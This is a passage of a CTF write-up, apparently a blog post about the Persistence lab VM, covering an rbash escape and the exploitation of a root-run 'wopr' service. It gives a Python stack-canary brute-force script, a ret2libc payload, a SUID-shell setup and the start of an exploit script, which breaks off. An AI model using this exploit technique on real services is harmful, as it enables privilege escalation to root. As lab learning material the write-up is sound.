-&lt;p&gt;I got dropped into another &lt;code&gt;rbash&lt;/code&gt; shell, however this time with a +. So, I went for &lt;code&gt;/bin/bash&lt;/code&gt; and&amp;hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!&lt;/p&gt;
-
-&lt;h2 id=&#34;the-wopr-game:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;the wopr game&lt;/h2&gt;
-
-&lt;p&gt;During the enumeration done while still stuck with &lt;code&gt;rbash&lt;/code&gt;, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of &lt;code&gt;netstat&lt;/code&gt;. Opening a telnet session to this port presented you with a &amp;lsquo;game&amp;rsquo;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ telnet 127.0.0.1 3333
-Trying 127.0.0.1...
-Connected to 127.0.0.1.
-Escape character is &#39;^]&#39;.
-[+] hello, my name is sploitable
-[+] would you like to play a game?
-&amp;gt; yes!
-[+] yeah, I don&#39;t think so
-[+] bye!
-Connection closed by foreign host.
-bash-4.1$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I asked really, really nicely, but no matter how polite I was, it would just not let me play!&lt;/p&gt;
-
-&lt;p&gt;Further inspection showed that the game was possibly run as root from &lt;code&gt;/usr/local/bin/wopr&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ps -ef | grep wopr
-root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
-root      1577  1005  0 06:43 ?        00:00:00 [wopr] &amp;lt;defunct&amp;gt;
-avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr
-
-bash-4.1$ ls -lah /usr/local/bin/wopr
--rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;wopr&lt;/code&gt; was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first, hex encode the file
-bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
-7f454c460101010000000000000000000200030001000000c08604083400000080110000
-0000000034002000090028001e001b000600000034000000348004083480040820010000
-[... snip ...]
-38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
-bash-4.1$
-
-# next, I copied the xxd output from the persistence terminal
-# and pasted it into a file called wopr.xxd. Then reverted it
-# and redirected the output to `wopr`
-root@kali:~# cat wopr.xxd | xxd -r -p &amp;gt; wopr
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&amp;hellip;&lt;/p&gt;
-
-&lt;h2 id=&#34;wopr-stack-smashing:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;wopr, stack smashing&lt;/h2&gt;
-
-&lt;p&gt;Poking around the binary, I mostly used &lt;code&gt;gdb&lt;/code&gt; along with &lt;a href=&#34;https://github.com/longld/peda&#34;&gt;peda&lt;/a&gt;.
-Checksec revealed that this binary was compiled with quite a few security features built in.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./wopr
-Reading symbols from persistence/wopr...(no debugging symbols found)...done.
-gdb-peda$ checksec
-CANARY    : ENABLED
-FORTIFY   : disabled
-NX        : ENABLED
-PIE       : disabled
-RELRO     : Partial
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.&lt;/p&gt;
-
-&lt;p&gt;With all of that in mind, I ran the binary with the &lt;code&gt;r&lt;/code&gt; command, and made a new telnet session to it.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ r
-[+] bind complete
-[+] waiting for connections
-[+] logging queries to $TMPLOG
-[+] got a connection
-[New process 26936]
-[Inferior 2 (process 26936) exited normally]
-Warning: not running or target is remote
-gdb-peda$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a &lt;code&gt;fork()&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass main
-Dump of assembler code for function main:
-    [.. snip ..]
-   0x080489fd &amp;lt;+543&amp;gt;:   mov    DWORD PTR [esp],0x8048cb2
-   0x08048a04 &amp;lt;+550&amp;gt;:   call   0x804866c &amp;lt;puts@plt&amp;gt;
-   0x08048a09 &amp;lt;+555&amp;gt;:   call   0x804867c &amp;lt;fork@plt&amp;gt; # &amp;lt;--
-   0x08048a0e &amp;lt;+560&amp;gt;:   test   eax,eax
-   0x08048a10 &amp;lt;+562&amp;gt;:   jne    0x8048b0e &amp;lt;main+816&amp;gt;
-   0x08048a16 &amp;lt;+568&amp;gt;:   mov    DWORD PTR [esp+0x8],0x21
-   0x08048a1e &amp;lt;+576&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048cc8
-   0x08048a26 &amp;lt;+584&amp;gt;:   mov    eax,DWORD PTR [ebp-0x22c]
-   0x08048a2c &amp;lt;+590&amp;gt;:   mov    DWORD PTR [esp],eax
-   0x08048a2f &amp;lt;+593&amp;gt;:   call   0x804858c &amp;lt;write@plt&amp;gt;
-    [.. snip ..]
-End of assembler dump.
-gdb-peda$
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Why is the &lt;code&gt;fork()&lt;/code&gt; so important!? We will see in a bit just hang on. :)&lt;/p&gt;
-
-&lt;p&gt;So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D&lt;/p&gt;
-
-&lt;p&gt;Sending 30 x A&amp;rsquo;s results in:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ [+] got a connection
-*** stack smashing detected ***: wopr terminated
-======= Backtrace: =========
-/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
-/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
-wopr[0x80487dc]
-wopr[0x8048ad6]
-/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
-wopr[0x80486e1]
-======= Memory map: ========
-08048000-08049000 r-xp 00000000 08:01 1184792    wopr
-08049000-0804a000 r--p 00000000 08:01 1184792    wopr
-0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
-0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
-b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
-b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
-b7e73000-b7e74000 rw-p 00000000 00:00 0
-b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
-b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
-b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
-b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
-b7fc1000-b7fc4000 rw-p 00000000 00:00 0
-b7fde000-b7fe1000 rw-p 00000000 00:00 0
-b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
-b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
-b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
-b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
-bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So it looks like we may have a &lt;a href=&#34;http://en.wikipedia.org/wiki/Stack_buffer_overflow&#34;&gt;buffer overflow&lt;/a&gt; here. What is important though is the backtrace shows that the last fail was in &lt;code&gt;__fortify_fail&lt;/code&gt;. &lt;code&gt;__fortify_fail&lt;/code&gt; is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the &lt;code&gt;checksec&lt;/code&gt; output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.&lt;/p&gt;
-
-&lt;p&gt;But lets not stop there. I continued to place more A&amp;rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&amp;rsquo;s, the backtrace had a full 4 bytes of 41.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[+] got a connection
-*** stack smashing detected ***: wopr terminated
-======= Backtrace: =========
-/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
-/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
-wopr[0x80487dc]
-[0x41414141]        #&amp;lt;-- EIP?
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Was this where EIP was?
-With the debugging we have done thus far, lets assume that the stack layout looks something like this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;         - &amp;gt;
-
-[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]
-
-- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;         - &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;wopr-stack-canary-bruteforce:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;wopr - stack canary bruteforce&lt;/h2&gt;
-
-&lt;p&gt;This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.&lt;/p&gt;
-
-&lt;p&gt;A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;&lt;a href=&#34;http://phrack.org/issues/67/13.html&#34;&gt;Phrack Issue 67&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/&#34;&gt;The Art Of ELF: Analysis and Exploitations&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href=&#34;http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/&#34;&gt;Fusion level04 write-up&lt;/a&gt; (SPOILER ALERTS for another CTF)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Now, remember I mentioned &lt;code&gt;fork()&lt;/code&gt; earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of &lt;code&gt;fork()&lt;/code&gt; and how this affects stack cookies.&lt;/p&gt;
-
-&lt;p&gt;From &lt;code&gt;man 2 fork&lt;/code&gt;&amp;rsquo;s description:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;DESCRIPTION
-     Fork() causes creation of a new process.  The new process (child process)
-     is an exact copy of the calling process (parent process) except for the
-     following:
-
- [.. snip ..]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;What this means for us then is that every time we have a new &lt;code&gt;fork()&lt;/code&gt; happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. &lt;em&gt;”Soooooooo what?”&lt;/em&gt; I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!&lt;/p&gt;
-
-&lt;p&gt;The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of &lt;code&gt;wopr&lt;/code&gt;, I can just watch the console output, however, I don&amp;rsquo;t have that luxury on the Persistence VM!&lt;/p&gt;
-
-&lt;p&gt;While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) -&amp;gt; xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!&lt;/p&gt;
-
-&lt;p&gt;When a string of less than 30 A&amp;rsquo;s is sent, the server will send a &amp;ldquo;[+] bye!&amp;rdquo; message before closing the socket. More than 30 A&amp;rsquo;s, and the socket is killed before the bye&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# telnet 127.0.0.1 3333
-Trying 127.0.0.1...
-Connected to 127.0.0.1.
-Escape character is &#39;^]&#39;.
-[+] hello, my name is sploitable
-[+] would you like to play a game?
-&amp;gt; A
-[+] yeah, I don&#39;t think so
-[+] bye!                           # &amp;lt;-- We have a bye!
-Connection closed by foreign host.
-
-root@kali:~# telnet 127.0.0.1 3333
-Trying 127.0.0.1...
-Connected to 127.0.0.1.
-Escape character is &#39;^]&#39;.
-[+] hello, my name is sploitable
-[+] would you like to play a game?
-&amp;gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-[+] yeah, I don&#39;t think so
-Connection closed by foreign host. # &amp;lt;-- No bye!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word &lt;em&gt;bye&lt;/em&gt; in the last socket receive to know if we have succeeded or not. The resultant script was therefore:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
-import sys
-
-payload = &amp;quot;A&amp;quot; * 30  # amount of bytes before the first canary bit is hit
-canary = &amp;quot;&amp;quot;         # the canary
-
-# start the canary brute loop. We want to brute 4 bytes ...
-for x in xrange(1,5):
-
-    # ... and try all possibilities
-    for canary_byte in xrange(0, 256):
-
-        # prepare the byte
-        hex_byte = chr(canary_byte)
-
-        # prepare the payload
-        send = payload + canary + hex_byte
-
-        print &amp;quot;[+] Trying: &#39;\\x{0}&#39; in payload &#39;%s&#39; (%d:%d/255)&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;)) % (send, x, canary_byte)
-
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.connect((&#39;127.0.0.1&#39;, 3333))
-
-        # get the inital banners
-        sock.recv(35)   # [+] hello, my name is sploitable\n
-        sock.recv(40)   # [+] would you like to play a game?\n
-        sock.recv(5)    # &amp;gt;
-
-        # send the payload
-        sock.send(send)
-        sock.recv(27)   # [+] yeah, I don&#39;t think so\n
-
-        # if we have a OK response, then we will have this last part
-        # as &#39;[+] bye!\n&#39; populated, if its wrong, not
-        data =  sock.recv(64)   # [+] bye!\n
-        if &amp;quot;bye&amp;quot; in data:
-            print &amp;quot;[!!] Found a possible canary value of &#39;{0}&#39;!&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;))
-            canary += hex_byte
-            sock.close()
-            break
-
-        sock.close()
-
-    # if we cant even find the first byte, we failed already
-    if len(canary) &amp;lt;= 0:
-        print &amp;quot;[-] Unable to even find the first bit. No luck&amp;quot;
-        sys.exit(0)
-
-if len(canary) &amp;gt; 0:
-    print &amp;quot;[+] Canary seems to be {0}&amp;quot;.format(canary.encode(&amp;quot;hex&amp;quot;))
-else:
-    print &amp;quot;[-] Unable to brute canary&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;An example run of this would end as follows:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[+] Trying: &#39;\x8d&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:141/255)
-[+] Trying: &#39;\x8e&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:142/255)
-[+] Trying: &#39;\x8f&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:143/255)
-[+] Trying: &#39;\x90&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:144/255)
-[!!] Found a possible canary value of &#39;90&#39;!
-[+] Canary seems to be 00ef8d90
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&amp;rsquo;s and send it. No stack smashing message appeared and we got the &lt;em&gt;bye&lt;/em&gt; message :)&lt;/p&gt;
-
-&lt;h2 id=&#34;wopr-nx-and-eip:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;wopr - NX and EIP&lt;/h2&gt;
-
-&lt;p&gt;If you can recall from earlier, &lt;code&gt;wopr&lt;/code&gt; was compiled with the NX bit set. Effectively that means we can&amp;rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.&lt;/p&gt;
-
-&lt;p&gt;The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the &lt;code&gt;system()&lt;/code&gt; command, for almost obvious reasons.&lt;/p&gt;
-
-&lt;p&gt;I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ldd /usr/local/bin/wopr
-    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
-    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7e62000)
-    /lib/ld-linux.so.2 (0x00110000)
-
-bash-4.1$ ldd /usr/local/bin/wopr
-    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
-    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7e62000)
-    /lib/ld-linux.so.2 (0x00110000)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The addresses for the linked files remained static between all of the lookups, indicating that ASLR was not enabled. This makes things slightly easier. Because this is a 32bit OS though, even if it was enabled it would not have been too much of a issue :)&lt;/p&gt;
-
-&lt;p&gt;The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple &lt;code&gt;export SHELL=/bin/bash&lt;/code&gt; fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ export SHELL=/bin/bash
-
-bash-4.1$ gdb -q /usr/bin/telnet
-Reading symbols from /usr/bin/telnet...(no debugging symbols found)...done.
-Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
-(gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
-Breakpoint 1 at 0x7b90
-
-(gdb) r         # run the program
-Starting program: /usr/bin/telnet
-Breakpoint 1, 0x00117b90 in main ()
-
-(gdb) p system  # We hit our breakpoint, lets leak the address for system()
-$1 = {&amp;lt;text variable, no debug info&amp;gt;} 0xb7e56210 &amp;lt;system&amp;gt;
-(gdb)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We find &lt;code&gt;system()&lt;/code&gt; at &lt;code&gt;0xb7e56210&lt;/code&gt;. I used the telnet binary simply because it is also linked to libc.&lt;/p&gt;
-
-&lt;p&gt;So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;           - &amp;gt;
-
-[   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
- ^~ Initial BF    ^~ Bruted cookie                    ^~ system()
-
-- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;           - &amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The address for &lt;code&gt;system()&lt;/code&gt; is &amp;lsquo;backwards&amp;rsquo; because we are working with a &lt;a href=&#34;http://en.wikipedia.org/wiki/Endianness&#34;&gt;little endian&lt;/a&gt; system. The 4 * A before the address to &lt;code&gt;system()&lt;/code&gt; is simply padding to EIP.&lt;/p&gt;
-
-&lt;h2 id=&#34;wopr-code-exec:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;wopr - code exec&lt;/h2&gt;
-
-&lt;p&gt;This part, by far, took me &lt;strong&gt;the longest&lt;/strong&gt; of the entire challenge!&lt;/p&gt;
-
-&lt;p&gt;The next step was to get actual code to execute using &lt;code&gt;system()&lt;/code&gt;. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was &amp;ldquo;to remember, you are trying to make a program do what it is not intended to do, expect difficulty!&amp;rdquo;.&lt;/p&gt;
-
-&lt;p&gt;I tried to put a command in a env variable and failed.
-I attempted to write a ROP chain and failed.&lt;/p&gt;
-
-&lt;p&gt;These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script &lt;code&gt;/tmp/runme&lt;/code&gt; to run. &lt;code&gt;runme&lt;/code&gt; was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had &lt;code&gt;gcc&lt;/code&gt; installed :)&lt;/p&gt;
-
-&lt;p&gt;&amp;ldquo;fail&amp;rdquo; * 100000 * 100000. That is a rough guestimate of the amount of times I tried this part.&lt;/p&gt;
-
-&lt;p&gt;Eventually, I finally came to the realization that I may have to search for other avenues of code execution. In fact, I completely stepped away from the VM and did something else.&lt;/p&gt;
-
-&lt;p&gt;Returning later with a fresh look, I run wopr through &lt;code&gt;strings&lt;/code&gt; one more time:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/persistence# strings  wopr
-/lib/ld-linux.so.2
-__gmon_start__
-libc.so.6
-_IO_stdin_used
-
-[.. snip ..]
-
-[^_]
-[+] yeah, I don&#39;t think so
-socket
-setsockopt
-bind
-[+] bind complete
-listen
-/tmp/log          # &amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;&amp;lt;
-TMPLOG
-[+] waiting for connections
-[+] logging queries to $TMPLOG
-accept
-[+] got a connection
-[+] hello, my name is sploitable
-[+] would you like to play a game?
-[+] bye!
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;See that? Can you &lt;strong&gt;see&lt;/strong&gt; that&amp;hellip; We have &lt;code&gt;/tmp/log&lt;/code&gt; RIGHT THERE!&lt;/p&gt;
-
-&lt;p&gt;I confirmed that &lt;code&gt;/tmp/log&lt;/code&gt; wasn&amp;rsquo;t actually in use, and moved my original &lt;code&gt;/tmp/runme&lt;/code&gt; script there.&lt;/p&gt;
-
-&lt;p&gt;The only thing that was left now was to find the location of the string &lt;code&gt;/tmp/log&lt;/code&gt; in &lt;code&gt;wopr&lt;/code&gt;, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./wopr
-Reading symbols from wopr...(no debugging symbols found)...done.
-
-gdb-peda$ b *main
-Breakpoint 1 at 0x80487de
-
-gdb-peda$ r
-[----------------------------------registers-----------------------------------]
-EAX: 0xbffff4a4 --&amp;gt; 0xbffff60a (&amp;quot;wopr&amp;quot;)
-EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
-ECX: 0x66a6f92e
-EDX: 0x1
-ESI: 0x0
-EDI: 0x0
-EBP: 0xbffff478 --&amp;gt; 0x0
-ESP: 0xbffff3fc --&amp;gt; 0xb7e8ae36 (&amp;lt;__libc_start_main+230&amp;gt;:    mov    DWORD PTR [esp],eax)
-EIP: 0x80487de (&amp;lt;main&amp;gt;: push   ebp)
-EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
-[-------------------------------------code-------------------------------------]
-   0x80487d7 &amp;lt;get_reply+99&amp;gt;:    call   0x804865c &amp;lt;__stack_chk_fail@plt&amp;gt;
-   0x80487dc &amp;lt;get_reply+104&amp;gt;:   leave
-   0x80487dd &amp;lt;get_reply+105&amp;gt;:   ret
-=&amp;gt; 0x80487de &amp;lt;main&amp;gt;:    push   ebp
-   0x80487df &amp;lt;main+1&amp;gt;:  mov    ebp,esp
-   0x80487e1 &amp;lt;main+3&amp;gt;:  sub    esp,0x258
-   0x80487e7 &amp;lt;main+9&amp;gt;:  mov    eax,DWORD PTR [ebp+0x8]
-   0x80487ea &amp;lt;main+12&amp;gt;: mov    DWORD PTR [ebp-0x23c],eax
-[------------------------------------stack-------------------------------------]
-0000| 0xbffff3fc --&amp;gt; 0xb7e8ae36 (&amp;lt;__libc_start_main+230&amp;gt;:   mov    DWORD PTR [esp],eax)
-0004| 0xbffff400 --&amp;gt; 0x1
-0008| 0xbffff404 --&amp;gt; 0xbffff4a4 --&amp;gt; 0xbffff60a (&amp;quot;wopr&amp;quot;)
-0012| 0xbffff408 --&amp;gt; 0xbffff4ac --&amp;gt; 0xbffff629 (&amp;quot;SSH_AGENT_PID=3171&amp;quot;)
-0016| 0xbffff40c --&amp;gt; 0xb7fe08d8 --&amp;gt; 0xb7e74000 --&amp;gt; 0x464c457f
-0020| 0xbffff410 --&amp;gt; 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
-0024| 0xbffff414 --&amp;gt; 0xffffffff
-0028| 0xbffff418 --&amp;gt; 0xb7ffeff4 --&amp;gt; 0x1cf2c
-[------------------------------------------------------------------------------]
-Legend: code, data, rodata, value
-Breakpoint 1, 0x080487de in main ()
-
-gdb-peda$ searchmem /tmp/log
-Searching for &#39;/tmp/log&#39; in: None ranges
-Found 2 results, display max 2 items:
-wopr : 0x8048c60 (&amp;quot;/tmp/log&amp;quot;)
-wopr : 0x8049c60 (&amp;quot;/tmp/log&amp;quot;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;&lt;code&gt;/tmp/log&lt;/code&gt; can be found in 2 places. Lets choose &lt;code&gt;0x8048c60&lt;/code&gt;! Now we finally have everything we need to build the payload to send.&lt;/p&gt;
-
-&lt;h2 id=&#34;wopr-the-exploit:86c048549ce161bd5ac3e0fef5e4f842&#34;&gt;wopr - the exploit&lt;/h2&gt;
-
-&lt;p&gt;To sum up what we have to do to exploit this, we can say that we have to:&lt;/p&gt;
-
-&lt;ul&gt;
-&lt;li&gt;Provide a string of size 30&lt;/li&gt;
-&lt;li&gt;Provide the canary we have brute forced&lt;/li&gt;
-&lt;li&gt;Pad with 4 bytes&lt;/li&gt;
-&lt;li&gt;Write EIP to the location of &lt;code&gt;system()&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;Provide 4 bytes of JUNK (or the location of &lt;code&gt;exit()&lt;/code&gt; as a return)&lt;/li&gt;
-&lt;li&gt;Provide the location of &lt;code&gt;/tmp/log&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;In my exploit, as a result of the above, I would therefore send a payload similar to this:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot; + &amp;quot;\xff\xff\xff\xff&amp;quot; + &amp;quot;AAAA&amp;quot; +
-&amp;quot;\x10\xc2\x16\x00&amp;quot; + &amp;quot;JUNK&amp;quot; + &amp;quot;\x60\x8c\x04\x08&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;I finished up coding the exploit, which eventually resulted in the following:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
-import sys
-import os
-
-payload = &amp;quot;A&amp;quot; * 30  # amount of bytes to before the canary is hit
-canary = &amp;quot;&amp;quot;     # canary that should update as its bruted
-
-print &amp;quot;&amp;quot;&amp;quot;
-            A: &amp;quot;So, I heard you like pain...?&amp;quot;
-            B: &amp;quot;... a bit&amp;quot;
-            C: &amp;quot;Well, here it is, the: &amp;quot;
- ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
-|    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
-|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
-|   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
-|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
-|  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
-|__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
-      _____ ____  _       ___  ____  ______
